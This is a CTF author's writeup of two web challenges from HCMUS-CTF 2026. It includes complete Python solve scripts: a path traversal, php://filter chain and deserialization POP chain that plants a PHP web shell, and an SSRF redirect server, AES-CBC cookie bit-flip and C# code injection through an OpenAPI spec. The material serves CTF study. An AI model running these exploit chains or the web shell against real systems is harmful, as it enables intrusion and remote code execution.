---
title: HCMUS-CTF 2026 Quals Writeup(Author)
published: 2026-05-26
description: 'Writeup for HCMUS-CTF 2026 Quals Writeup as author'
image: './hcmus2026.png'
tags: [web, CTF, writeup]
category: 'Writeup'
draft: false 
lang: ''
---

# HCMUS CTF 2026 Quals writeup

## web/Fun PHP

TLDR: It is from the last section of [this post](https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html#php-81) 

The intended solve is this:
1. At `/reports/download`, it has path traversal bug that can be used to read files. We can use it to read `secrets/admin_ticket.txt` and see this string `2026ctfhcmus`
2. At `/dashboard/integrations/import-reference`, we have to provide url that when fetch, the content have to match content at `secrets/admin_ticket.txt` in order to become admin. The intended one is using php://filter chain
3. After become admin, we can see a sink `SnapshotPublisher::publishSnapshot()`  in  file `enterprisereports.php` that allow to write web shell. In order to trigger it, we can use sink `unserialize()` to generate POP chain at `/reports/import-preset`. The chain is easy and AI can figure it out. The chain eventually will call `$rawClass::$method($block->args)` and all param here is controllable.

    Unfortunately, the class `SnapshotPublisher` only init if `FeatureFlags::enabled('enterprise_snapshots')` return true but that value is fixed to false. The idea is when php parse non-top-level class, it store class in a hash table called class_table in which the key is a special class name generate from the function [zend_build_runtime_definition_key()](https://github.com/php/php-src/blob/6b68d9433fe5c3c7aa1c0b8f22352d87837cca71/Zend/zend_compile.c#L175) and the value is the info of that class. The flow would be `zend_compile_top_stmt()` -> `zend_compile_stmt()` -> `zend_compile_class_decl()` -> `zend_build_runtime_definition_key()` and `zend_hash_add_ptr(CG(class_table), key, ce)` in [zend_compile.c](https://github.com/php/php-src/blob/6b68d9433fe5c3c7aa1c0b8f22352d87837cca71/Zend/zend_compile.c). Even when the condition is false and the class haven't init, the name is still there and  if we using that special name, php will [look up](https://github.com/php/php-src/blob/6b68d9433fe5c3c7aa1c0b8f22352d87837cca71/Zend/zend_execute_API.c#L1190) that name in class_table, and retrieve the bytecode of that class. The format of that class name will be `\0{namespace\class}{path/to/file}:{line_of_class}${number_of_non_top_level_classes}`


<details>
  <summary>solve.py</summary>
  
  ```python
import base64
import re
import requests

# url = "http://localhost:8000"
url = "http://chall.blackpinker.com:20334"
timeout = 8
ticket_ref = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7||convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=php://temp"

path = "/var/www/app/insight/module/enterprisereports.php"
line = 114
counter = 13

session = requests.Session()

def s(x):
    return f's:{len(x.encode())}:"{x}";'

def arr(items):
    out = [f"a:{len(items)}:{{"]
    for k, v in items:
        out += [s(k), s(v)]
    return "".join(out) + "}"

def obj(name, props):
    out = [f'O:{len(name.encode())}:"{name}":{len(props)}:{{']
    for k, v in props:
        out += [s(k), v]
    return "".join(out) + "}"


def preset(cls):
    block = obj("App\\Insight\\Model\\ReportBlock", [
        ("title", s("Executive Export Publisher")),
        ("class", s(cls)),
        ("method", s("publishSnapshot")),
        ("args", arr([
            ("name", "shell.php"),
            ("body", '<?php system($_GET["cmd"] ?? "id"); ?>'),
        ])),
    ])
    return obj("App\\Insight\\Model\\DashboardPreset", [
        ("name", s("Quarterly Executive Export")),
        ("layout", s("grid-2")),
        ("blocks", f"a:1:{{i:0;{block}}}"),
    ])


def candidate(line, counter):
    return "\\\x00" + f"app\\insight\\module\\snapshotpublisher{path}:{line}${counter:x}"


def main():
    secret = session.get(
        url + "/reports/download?file=../../secrets/admin_ticket.txt",
        timeout=timeout,
    ).text
    print("[+] ticket:", secret)

    page = session.post(
        url + "/dashboard/integrations/import-reference",
        data={"ticket_ref": ticket_ref},
        timeout=timeout,
    ).text
    if "Operator workspace is active" not in page:
        print("admin failed")
        return 1
    print("[+] admin")

    payload = base64.urlsafe_b64encode(preset(candidate(line, counter)).encode()).decode()
    session.post(url + "/reports/import-preset", data={"preset": payload}, timeout=timeout)
    res = session.get(url + "/shell.php", params={"cmd": "/readflag"}, timeout=timeout).text.strip()
    if re.search(r"[A-Za-z0-9_-]*HCMUS-CTF\{[^}\r\n]+\}", res, re.I):
        print(res)


main()
```

  
</details>

 

## web/Core Issues

Somehow this chall get slopped. The intended solve:
1. SSRF 307 redirect to preserve the HTTP method, the host check can be bypass by using unicode
2. The internal portal is vulnerable to this CVE: https://github.com/dotnet/announcements/issues/395. In the original library `Microsoft.AspNetCore.DataProtection` code, we can provided null byte at the hmac part of the cookie to bypass the hmac check at function `CalculateAndValidateMac()` in `ManagedAuthenticatedEncryptor.cs`. To force you to read the library code(which you didn't), I have patched the `Microsoft.AspNetCore.DataProtection.dll` so that you have to provide hmac as `"hehe" * 8` (32 byte). 

    After bypass the hmac check, because the cipher text using AES CBC mode, you can flip the bit of the cookie from `admin=false;` to `admin=true;;` and become admin
3. The goal of the last chain is provide openAPI spec so that when the library `Microsoft.Kiota` generate C# SDK and run smoke test from it, we can execute code. We can inject code using some fields, I use `description` field to inject a  malicious class and `default` field to trigger the malicious function. To bypass filter, we can replace identifiers in C# with unicode characters.


<details>
  <summary>solve.py</summary>
  
  ```python
import base64
import json
import re
import requests
import time
# target = "http://127.0.0.1:8080"
target = "http://chall.blackpinker.com:20341"
username = "huli07"
email = "huli07@example.com"
password = "huli07-password-2026"
# url = "http://host.docker.internªl:2807"
url = "https://4b4d-27-2-6-4.ngrok-free.app"

def ssrf(session, url, method, headers=None, body=""):
    res = session.post(
        f"{target}/api/webhooks/test",
        json={
            "url": url,
            "method": method,
            "headers": headers or {},
            "body": body,
            "timeout": 180,
        },
        timeout=180,
    )
    return res.json()


def login():
    session = requests.Session()
    session.post(
        f"{target}/api/signup",
        json={"username": username, "email": email, "password": password},
        timeout=180,
    )
    session.post(f"{target}/api/login", json={"username": username, "password": password}, timeout=180)
    return session


def forge(cookie, session, url):
    raw = bytearray(base64.urlsafe_b64decode(cookie + "=" * (-len(cookie) % 4)))
    flip = bytes(a ^ b for a, b in zip(b"false", b"true;"))

    for i in range(len(raw) - 32 - len(flip)):
        test = bytearray(raw)
        for j, value in enumerate(flip):
            test[i + j] ^= value
        test[-32:] = b"hehe" * 8
        value = base64.urlsafe_b64encode(test).decode().rstrip("=")
        res = ssrf(session, url, "GET", headers={"Cookie": f".AspNetCore.Portal={value}"})
        if re.search(r'"role"\s*:\s*"admin"', res.get("body", "")):
            return value
        time.sleep(1) 

    return ""


def sdk_body():
    def cs(name):
        return ".".join("".join(f"\\u{ord(c):04x}" for c in part) for part in name.split("."))
    path = ",".join(str(ord(c)) for c in "/readflag")
    helper = (
        "Inventory model used by the connector smoke test."
        "\u2028public partial class CatalogItem { string Load(){"
        "string C(params int[]a){var s=string.Empty;foreach(var i in a)s+=Convert.ToChar(i);return s;}"
        f"var p=new {cs('System.Diagnostics.ProcessStartInfo')}(C({path}));"
        f"p.{cs('UseShellExecute')}=false;"
        f"p.{cs('RedirectStandardOutput')}=true;"
        f"var x={cs('System.Diagnostics.Process')}.{cs('Start')}(p);"
        f"x.{cs('WaitForExit')}();"
        f"return x.{cs('StandardOutput')}.{cs('ReadToEnd')}();"
        "} }//"
    )
    return {
        "connectorName": "Partner Inventory",
        "environment": "staging",
        "ownerEmail": "integrations@example.test",
        "openApi": {
            "openapi": "3.1.0",
            "info": {"title": "Partner Inventory", "version": "1.0.0"},
            "paths": {
                "/inventory/items": {
                    "get": {
                        "responses": {
                            "200": {
                                "description": "ok",
                                "content": {
                                    "application/json": {
                                        "schema": {"$ref": "#/components/schemas/CatalogItem"}
                                    }
                                },
                            }
                        }
                    }
                }
            },
            "components": {
                "schemas": {
                    "CatalogItem": {
                        "type": "object",
                        "description": helper,
                        "properties": {
                            "sku": {
                                "type": "string",
                                "description": "Partner SKU used when the item has not been normalized yet.",
                                "default": '\\";Sku=Load();//',
                            },
                            "name": {"type": "string"},
                        },
                    }
                }
            },
        },
    }

def main():
    session = login()
    set_cookie = ssrf(session, f"{url}/", "GET").get("headers").get("Set-Cookie")
    cookie = set_cookie.split(".AspNetCore.Portal=")[1].split(";")[0]
    admin_cookie = forge(cookie, session, f"{url}/api/me")
    print(admin_cookie)

    res = ssrf(
        session,
        f"{url}/api/connectors/preview",
        "POST",
        {
            "Cookie": f".AspNetCore.Portal={admin_cookie}",
            "Content-Type": "application/json",
        },
        json.dumps(sdk_body()),
    )
    print(res)
    data = json.loads(res["body"])
    print(json.dumps(data))

    match = re.search(r"HCMUS-CTF\{[^}]+\}", data.get("smokeTest").get("stdout"))
    if match:
        print(f"\nflag: {match.group(0)}")

main()
```
  
</details>

<details>
  <summary>server.py</summary>
  
  ```python
from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer

class redirect(BaseHTTPRequestHandler):
    def response(self):
        path = self.path if self.path.startswith("/") else "/"
        location = f"http://intern%C2%AAl:8080{path}"
        self.send_response(307)
        self.send_header("Location", location)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        self.response()

    def do_POST(self):
        self.response()

    def log_message(self, fmt, *args):
        return


server = HTTPServer(('0.0.0.0', 2807), redirect)
print("Serving on port 2807...")
server.serve_forever()
```
  
</details>


> Thanks AI for the solve script :D
>
> Fun fact: I intended that the Fun PHP challenge would be easier than Core Issues because the trick is on the Internet, but somehow it got less solves :v